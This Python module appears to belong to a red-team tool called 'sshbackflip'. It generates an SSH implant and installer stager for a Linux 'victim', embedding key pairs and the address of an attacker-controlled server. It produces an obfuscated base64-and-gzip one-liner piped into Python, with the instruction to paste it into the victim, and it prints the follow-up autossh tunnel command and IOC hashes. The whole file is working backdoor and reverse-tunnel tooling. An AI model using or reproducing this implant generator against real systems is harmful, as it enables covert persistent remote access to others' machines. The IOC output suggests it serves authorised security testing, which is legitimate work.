#!/usr/bin/env python3
# Copyright (c) 2024, Oracle and/or its affiliates.

import os
import pathlib
import sys
import base64
import tempfile
import jinja2
from . import core, settings


def makebackflip(backflipServer, victim, args):
    logging = args.verbose
    payloadName = "".join(core.getrandomwords(2))
    print(f"Logging is {logging}")
    print(f"[*] username: {victim.username}")
    print(f"[*] victim hostname: {victim.hostname}")
    print(f"[*] fqdn: {backflipServer.name}")
    print(f"[*] victim port: {victim.port}")
    print(f"[I] Payload name: {payloadName}")

    pubkey = base64.b64encode(victim.pubKey.encode()).decode('utf-8')
    privkey = base64.b64encode(victim.privKey.encode()).decode('utf-8')

    jinjenv = jinja2.Environment(loader=jinja2.FileSystemLoader("sshbackflip/linux/"))

    if args.python2:
        it = "implant_py2.py"
        st = "install_implant_py2.py"
        pv = "python"
    else:
        it = "implant_py3.py"
        st = "install_implant_py3.py"
        pv = "python3"

    implant_template = jinjenv.get_template(it)
    implant = implant_template.render({
        "PORT_PLACEHOLDER":victim.port,
        "FQDN_PLACEHOLDER":backflipServer.name,
        "BACKFLIP_PORT":backflipServer.port})
    implant = core.nocomments(implant)

    stager_template = jinjenv.get_template(st)
    payload = stager_template.render({
    "PRIVATE_KEY_PLACEHOLDER": privkey,
    "PUBLIC_KEY_PLACEHOLDER": pubkey,
    "PORT_PLACEHOLDER": victim.port,
    "FQDN_PLACEHOLDER": backflipServer.name,
    "IMPLANT_PLACEHOLDER": core.gzbase(implant)})
    script = core.nocomments(payload)

    gzbased = core.gzbase(script)
    cmd = f"echo '{gzbased}'|base64 -d|gzip -d|{pv}"
    print("[+] paste the following into the victim")
    print(cmd)
    implantName = f"linux-{victim.username}-{victim.hostname}-{backflipServer.name}-{payloadName}"
    with open(f"{settings.PAYLOADS_DIR}/{implantName}", "w") as f:  # mode='w' for writing strings
        f.write(cmd)
    print(f"[+] This is also available to you in the file {f.name}")
    print(f"[*] Once this tunnel is up run: ../install_autossh_backflip.py {victim.port} PROXYPORT {victim.privKeyPath}")
    print("\n[I] IOCs :")
    print(f"[I] Backflip Public Key [{victim.pubKeyPath}]\n\t|SHA256:{core.getfilehash(f'{victim.pubKeyPath}').hexdigest()} \n\t|MD5:{core.getfilehash_md5(f'{victim.pubKeyPath}').hexdigest()}")
    print(f"[I] Backflip Private Key [{victim.privKeyPath}]\n\t|SHA256:{core.getfilehash(f'{victim.privKeyPath}').hexdigest()} \n\t|MD5:{core.getfilehash_md5(f'{victim.privKeyPath}').hexdigest()}")

    print(f"\n[+] Have a nice day!")